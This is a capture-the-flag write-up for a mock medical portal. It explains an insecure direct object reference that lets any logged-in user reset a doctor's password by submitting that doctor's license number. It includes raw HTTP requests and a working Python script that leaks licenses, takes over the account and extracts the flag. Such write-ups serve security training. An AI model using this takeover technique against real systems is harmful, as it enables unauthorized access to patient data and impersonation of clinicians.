---
title: "What's Up Doc?"
date: 2026-08-15
tags:
  - web
  - idor
  - auth
  - aussiemed
description: An IDOR in the profile update endpoint lets you take over any doctor account by submitting their license number. 270 points.
---
# AussieMed CTF — "What's Up Doc?" (270)

**Challenge:** https://nej3tgmbyzb6.aussiemed.ctf.urisc.club/login/

**Goal:** You can log in as a registered user, but there's "nothing here" — you need to escalate to a **doctor** account and grab the flag.

**Flag:**
- `SRCTF!{an_apple_a_day}` — on the dashboard of a doctor

---

## The vulnerability

`POST /dashboard/profile` has an **IDOR (Insecure Direct Object Reference)**.

The profile update form looks up the user by the **`license` field you submit**, NOT by the session's `user_id`. So you can submit **anyone's** license number and change their `full_name` and `password`.

Real doctor license numbers are leaked by the API:

```
GET /api/users/getRegistered
```

...which returns every registered user including their `License`, `Name`, `Manager`, and `Organisation`.

## Exploit steps (easiest path)

### 1. Log in as the registered user

```
POST /login/
license=MED0012345678
password=test
```

This gives you a session cookie, e.g. `{"role":"registered","user_id":96163}`.

### 2. Grab a real doctor's license

```
GET /api/users/getRegistered
```

Pick any doctor, e.g.:

```json
{
  "License": "MED0000282459",
  "Name": "Dr. Ingrid Solberg",
  "Manager": "Dr. Liam Prosser",
  "Organisation": "Silverton Health Partners"
}
```

### 3. Take over the doctor via the profile IDOR

Send the doctor's license to the profile update endpoint with a **new password** (and restore their name so nothing looks broken):

```
POST /dashboard/profile
license=MED0000282459
full_name=Dr. Ingrid Solberg
password=pwned123
```

The server updates **Dr. Ingrid Solberg's** password because it looks up by the submitted license.

### 4. Log in as the doctor

```
POST /login/
license=MED0000282459
password=pwned123
```

### 5. Grab the flag

```
GET /dashboard/
```

The dashboard now shows the news card:

```
Doctors must stay up-to-date with patient privacy laws! SRCTF!{an_apple_a_day}
```

As the doctor you also get access to patients, prescription records (PDFs), and the internal messaging system.

---

## One-liner (Python)

```python
import requests

BASE = "https://nej3tgmbyzb6.aussiemed.ctf.urisc.club"
s = requests.Session()

# 1. login as registered user
s.post(f"{BASE}/login/", data={"license": "MED0012345678", "password": "test"})

# 2. leak doctor licenses
doctors = s.get(f"{BASE}/api/users/getRegistered").json()
target = doctors[0]["License"]           # e.g. MED0000282459
name = doctors[0]["Name"]                # e.g. Dr. Ingrid Solberg

# 3. IDOR: reset the doctor's password
s.post(f"{BASE}/dashboard/profile",
       data={"license": target, "full_name": name, "password": "pwned123"})

# 4. log in as the doctor
s2 = requests.Session()
s2.post(f"{BASE}/login/", data={"license": target, "password": "pwned123"})

# 5. flag!
dash = s2.get(f"{BASE}/dashboard/").text
import re
print(re.findall(r"SRCTF!\{[^}]+\}", dash))
```

## Notes

- Registration is wide open: the register page's hidden `isLicensed` field is set client-side and never validated server-side (`/verifyLicense` always returns `{"licensed":false}`).
- Managers (`/api/getManagers/`) use numeric IDs, not licenses, so the same IDOR can't reach them — doctor is the intended target.
- Don't forget to restore the doctor's name if you changed it (polite to leave the challenge state clean for others).
